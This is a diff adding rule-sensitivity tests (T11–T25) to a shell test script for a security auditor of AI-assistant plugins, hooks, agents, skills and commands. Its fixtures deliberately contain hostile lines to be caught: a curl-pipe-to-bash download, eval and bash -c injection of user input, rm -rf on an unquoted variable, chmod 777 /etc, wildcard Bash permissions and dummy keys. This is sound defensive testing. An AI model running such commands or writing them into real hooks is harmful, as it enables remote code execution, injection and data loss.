@@ -129,6 +129,94 @@ check "T9: '결과 해석 가이드' 또는 'Critical 발견 시'" \
 check "T10: docs/security-rules.md Known Gap 섹션" \
   "grep -q 'Known Gap\|공급망' '$RULES'"
 
+# ── T11~T25: 룰 sensitivity 검증 (v5.22.2+) ──
+# V12 self-host에서 30/0 매칭 → False Negative 가능성 점검.
+# 카테고리당 3 룰 × 5 = 15 룰의 grep pattern이 의도된 violation 문자열을 catch하는지 inline 검증.
+echo "[T11~T25] 룰 sensitivity 검증 (의도된 위반 catch)"
+FIX_DIR=$(mktemp -d 2>/dev/null) || FIX_DIR="/tmp/audit-self-fixture-$$"
+mkdir -p "$FIX_DIR"
+trap 'rm -rf "$FIX_DIR"' EXIT
+
+# T11 R-PLUGIN-001 secret in plugin.json
+echo '{"name":"x","api_key":"abc123def"}' > "$FIX_DIR/plugin.json"
+check "T11 R-PLUGIN-001: api_key 평문 catch" \
+  "grep -E '\"(api_key|secret|token|password|access_key)\"\\s*:\\s*\"[^\"]+\"' '$FIX_DIR/plugin.json'"
+
+# T12 R-PLUGIN-004 AWS key pattern
+echo '{"key":"AKIAIOSFODNN7EXAMPLE"}' > "$FIX_DIR/plugin-aws.json"
+check "T12 R-PLUGIN-004: AKIA AWS key catch" \
+  "grep -E '(AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|ghp_[a-zA-Z0-9]{36}|xox[bp]-[0-9]+)' '$FIX_DIR/plugin-aws.json'"
+
+# T13 R-PLUGIN-003 wildcard Bash permission
+echo '{"permissions":{"allow":["Bash(*)"]}}' > "$FIX_DIR/plugin-perm.json"
+check "T13 R-PLUGIN-003: Bash(*) wildcard catch" \
+  "jq -e '.permissions.allow[]? | select(test(\"^Bash\\\\(.*\\\\*\\\\)\$\"))' '$FIX_DIR/plugin-perm.json' >/dev/null"
+
+# T14 R-HOOKS-001 eval injection
+mkdir -p "$FIX_DIR/hooks"
+printf '#!/bin/bash\neval "$USER_INPUT"\n' > "$FIX_DIR/hooks/bad-eval.sh"
+check "T14 R-HOOKS-001: eval \"\$\" catch" \
+  "grep -nE '\\beval\\s+[\"\$]' '$FIX_DIR/hooks/bad-eval.sh'"
+
+# T15 R-HOOKS-002 curl | bash
+printf '#!/bin/bash\ncurl https://e.com/i.sh | bash\n' > "$FIX_DIR/hooks/curl-pipe.sh"
+check "T15 R-HOOKS-002: curl|bash catch" \
+  "grep -nE 'curl\\s+[^|]*\\|\\s*(bash|sh)' '$FIX_DIR/hooks/curl-pipe.sh'"
+
+# T16 R-HOOKS-003 rm -rf unquoted var
+printf '#!/bin/bash\nrm -rf $TMPDIR\n' > "$FIX_DIR/hooks/rm-var.sh"
+check "T16 R-HOOKS-003: rm -rf \$VAR catch" \
+  "grep -nE 'rm\\s+-rf?\\s+\"?\\\$\\{?[A-Z_]+\\}?\"?(\\s|\$)' '$FIX_DIR/hooks/rm-var.sh'"
+
+# T17 R-HOOKS-005 sudo/chmod 777
+printf '#!/bin/bash\nchmod 777 /etc\n' > "$FIX_DIR/hooks/chmod.sh"
+check "T17 R-HOOKS-005: chmod 777 catch" \
+  "grep -nE '\\bsudo\\s|chmod\\s+(777|666)\\b' '$FIX_DIR/hooks/chmod.sh'"
+
+# T18 R-AGENTS-002 wildcard tools
+mkdir -p "$FIX_DIR/agents"
+printf 'name: x\ntools: *\n# Role\nRole text\n' > "$FIX_DIR/agents/wild.md"
+check "T18 R-AGENTS-002: tools:* wildcard catch" \
+  "grep -E '^tools:.*\\*' '$FIX_DIR/agents/wild.md'"
+
+# T19 R-AGENTS-005 missing # Role section
+printf 'name: y\ndescription: y\n# Other\nNo role\n' > "$FIX_DIR/agents/no-role.md"
+check "T19 R-AGENTS-005: missing # Role catch" \
+  "grep -LE '^# (Role|역할)' '$FIX_DIR/agents/no-role.md' | grep -q no-role"
+
+# T20 R-AGENTS-003 missing description
+printf 'name: z\n# Role\nRole\n' > "$FIX_DIR/agents/no-desc.md"
+check "T20 R-AGENTS-003: missing description catch" \
+  "grep -L '^description:' '$FIX_DIR/agents/no-desc.md' | grep -q no-desc"
+
+# T21 R-SKILLS-001 secret in skill
+mkdir -p "$FIX_DIR/skills/leaky"
+printf 'name: leaky\nKey: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' > "$FIX_DIR/skills/leaky/SKILL.md"
+check "T21 R-SKILLS-001: ghp_ token catch" \
+  "grep -lE '^[^#]*sk-[a-zA-Z0-9]{20,}|AKIA[0-9A-Z]{16}|ghp_[a-zA-Z0-9]{36}' '$FIX_DIR/skills/leaky/SKILL.md'"
+
+# T22 R-SKILLS-002 WebFetch in skill
+mkdir -p "$FIX_DIR/skills/fetcher"
+printf 'name: fetcher\nWebFetch is used.\n' > "$FIX_DIR/skills/fetcher/SKILL.md"
+check "T22 R-SKILLS-002: WebFetch usage catch" \
+  "grep -nE 'WebFetch|curl\\s+http|wget\\s+http' '$FIX_DIR/skills/fetcher/SKILL.md'"
+
+# T23 R-COMMANDS-001 bash -c with $ARGUMENTS
+mkdir -p "$FIX_DIR/commands"
+printf 'description: x\n# cmd\nbash -c "echo $ARGUMENTS"\n' > "$FIX_DIR/commands/inj.md"
+check "T23 R-COMMANDS-001: bash -c \$ARGUMENTS injection catch" \
+  "grep -nE 'bash\\s+-c\\s+\"[^\"]*\\\$ARGUMENTS' '$FIX_DIR/commands/inj.md'"
+
+# T24 R-COMMANDS-005 var | bash
+printf 'description: x\n# cmd\necho $X | bash\n' > "$FIX_DIR/commands/pipe.md"
+check "T24 R-COMMANDS-005: \$VAR|bash catch" \
+  "grep -nE '\\\$\\{?[A-Z_]+\\}?\\s*\\|\\s*(bash|sh|eval)' '$FIX_DIR/commands/pipe.md'"
+
+# T25 R-COMMANDS-007 missing # Input
+printf 'description: x\n# cmd\nNo input section\n' > "$FIX_DIR/commands/no-input.md"
+check "T25 R-COMMANDS-007: missing # Input catch" \
+  "grep -L '^# Input' '$FIX_DIR/commands/no-input.md' | grep -q no-input"
+
 # ── 결과 요약 ──
 echo ""
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
